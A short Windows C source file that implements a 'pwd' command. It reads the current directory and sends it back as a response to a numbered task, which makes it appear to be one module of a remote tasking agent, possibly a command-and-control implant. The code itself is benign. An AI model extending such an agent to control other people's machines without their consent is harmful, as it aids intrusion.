#define _WIN32_WINNT 0x0600
#include "commands.h"
#include "utils.h"
#include <stdio.h>
#include <windows.h>

#ifdef INCLUDE_CMD_PWD

void command_pwd(char *task_id, char *params) {
  char path[MAX_PATH] = {0};
  if (GetCurrentDirectory(MAX_PATH, path)) {
    send_task_response(task_id, path);
  } else {
    send_task_response(task_id, "Failed to get current directory");
  }
}

#endif
